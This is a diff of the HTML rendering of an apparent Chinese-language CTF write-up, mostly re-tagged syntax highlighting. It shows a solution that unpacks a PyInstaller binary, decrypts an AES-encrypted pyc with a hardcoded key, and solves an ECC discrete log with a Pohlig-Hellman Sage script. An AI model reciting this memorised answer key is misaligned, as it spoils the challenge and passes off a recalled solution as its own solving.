-        var1 = (var1 &lt;&lt; <span class="hljs-number">4</span>) | int(i, <span class="hljs-number">16</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> var0[::-<span class="hljs-number">1</span>]:
+        var1 = (var1 &lt;&lt; <span class="hljs-number">4</span>) | <span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>)
     <span class="hljs-keyword">return</span> var1</code></pre><p>接下来只需要寻找 from var import * 中的var即可
 根据pyinstxtractor.py的报错，发现magic number和python3.5差了1，于是将工具的检查去掉，用python3.5进行解包，可以得到var.pyc.encrypt</p>
 <p>手动解密</p>
 <pre class="hljs"><code><span class="hljs-keyword">import</span> zlib
 <span class="hljs-keyword">import</span> tinyaes
 
-key = <span class="hljs-string">'nu1lnu1lnu1lnu1l'</span>
+key = <span class="hljs-string">&#x27;nu1lnu1lnu1lnu1l&#x27;</span>
 
-obj = open(<span class="hljs-string">'var.pyc.encrypted'</span>, <span class="hljs-string">'rb'</span>).read()
+obj = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;var.pyc.encrypted&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()
 cipher = tinyaes.AES(key.encode(), obj[:<span class="hljs-number">16</span>])
 obj = cipher.CTR_xcrypt_buffer(obj[<span class="hljs-number">16</span>:])
 
 obj = zlib.decompress(obj)
 
-open(<span class="hljs-string">'var.pyc'</span>, <span class="hljs-string">'wb'</span>).write(obj)</code></pre><p>得到ECC的曲线和点</p>
-<pre class="hljs"><code><span class="hljs-attr">p</span> = <span class="hljs-number">0</span>xfffffffffffffffffffffffffffffffeffffac73
-<span class="hljs-attr">a</span> = <span class="hljs-number">0</span>xfffffffffffffffffffffffffffffffeffffac71
-<span class="hljs-attr">b</span> = <span class="hljs-number">0</span>x21
+<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;var.pyc&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(obj)</code></pre><p>得到ECC的曲线和点</p>
+<pre class="hljs"><code><span class="hljs-attribute">p</span> = <span class="hljs-number">0</span>xfffffffffffffffffffffffffffffffeffffac<span class="hljs-number">73</span>
+<span class="hljs-attribute">a</span> = <span class="hljs-number">0</span>xfffffffffffffffffffffffffffffffeffffac<span class="hljs-number">71</span>
+<span class="hljs-attribute">b</span> = <span class="hljs-number">0</span>x<span class="hljs-number">21</span>
 
-<span class="hljs-attr">Px</span> = <span class="hljs-number">0</span>xf6f8b692899e1b4c5c82580820c2c7cb5597e12e
-<span class="hljs-attr">Py</span> = <span class="hljs-number">0</span>xafb7be2af28b649dab76337b42ee310119413529
+<span class="hljs-attribute">Px</span> = <span class="hljs-number">0</span>xf<span class="hljs-number">6</span>f<span class="hljs-number">8</span>b<span class="hljs-number">692899</span>e<span class="hljs-number">1</span>b<span class="hljs-number">4</span>c<span class="hljs-number">5</span>c<span class="hljs-number">82580820</span>c<span class="hljs-number">2</span>c<span class="hljs-number">7</span>cb<span class="hljs-number">5597</span>e<span class="hljs-number">12</span>e
+<span class="hljs-attribute">Py</span> = <span class="hljs-number">0</span>xafb<span class="hljs-number">7</span>be<span class="hljs-number">2</span>af<span class="hljs-number">28</span>b<span class="hljs-number">649</span>dab<span class="hljs-number">76337</span>b<span class="hljs-number">42</span>ee<span class="hljs-number">310119413529</span>
 
-<span class="hljs-attr">Qx</span> = <span class="hljs-number">0</span>x4945e0d8dc57e88d5949f84bf09943f572dbebb1
-<span class="hljs-attr">Qy</span> = <span class="hljs-number">0</span>xb1bf040fe1939c7144341d3af61f36d63f47e272</code></pre><p>sage实现Pohlig-Hellman进行求解</p>
+<span class="hljs-attribute">Qx</span> = <span class="hljs-number">0</span>x<span class="hljs-number">4945</span>e<span class="hljs-number">0</span>d<span class="hljs-number">8</span>dc<span class="hljs-number">57</span>e<span class="hljs-number">88</span>d<span class="hljs-number">5949</span>f<span class="hljs-number">84</span>bf<span class="hljs-number">09943</span>f<span class="hljs-number">572</span>dbebb<span class="hljs-number">1</span>
+<span class="hljs-attribute">Qy</span> = <span class="hljs-number">0</span>xb<span class="hljs-number">1</span>bf<span class="hljs-number">040</span>fe<span class="hljs-number">1939</span>c<span class="hljs-number">7144341</span>d<span class="hljs-number">3</span>af<span class="hljs-number">61</span>f<span class="hljs-number">36</span>d<span class="hljs-number">63</span>f<span class="hljs-number">47</span>e<span class="hljs-number">272</span></code></pre><p>sage实现Pohlig-Hellman进行求解</p>
 <pre class="hljs"><code>p = <span class="hljs-number">0xfffffffffffffffffffffffffffffffeffffac73</span>
 a = <span class="hljs-number">0xfffffffffffffffffffffffffffffffeffffac71</span>
 b = <span class="hljs-number">0x21</span>
@@ -1236,16 +1236,16 @@ E = EllipticCurve(F, [a, b])
 P = E.point(P)
 Q = E.point(Q)
 
-print(factor(P.order()))
+<span class="hljs-built_in">print</span>(factor(P.order()))
 
 primes = [<span class="hljs-number">2</span>^<span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">17</span>, <span class="hljs-number">79</span>, <span class="hljs-number">4457</span>, <span class="hljs-number">40591</span>, <span class="hljs-number">585977563</span>, <span class="hljs-number">1460624777797</span>, <span class="hljs-number">5490618741917</span>]
 
 dlogs = []
 <span class="hljs-keyword">for</span> fac <span class="hljs-keyword">in</span> primes:
-    t = int(P.order()) // int(fac)
-    dlog = discrete_log(t*Q,t*P, operation=<span class="hljs-string">"+"</span>)
+    t = <span class="hljs-built_in">int</span>(P.order()) // <span class="hljs-built_in">int</span>(fac)
+    dlog = discrete_log(t*Q,t*P, operation=<span class="hljs-string">&quot;+&quot;</span>)
     dlogs += [dlog]
-    print(<span class="hljs-string">"factor: "</span>+str(fac)+<span class="hljs-string">", Discrete Log: "</span>+str(dlog))
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;factor: &quot;</span>+<span class="hljs-built_in">str</span>(fac)+<span class="hljs-string">&quot;, Discrete Log: &quot;</span>+<span class="hljs-built_in">str</span>(dlog))
 
 crt(dlogs, primes)</code></pre><p>得到的结果计算十六进制并反转就是最后的flag</p>
 <h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
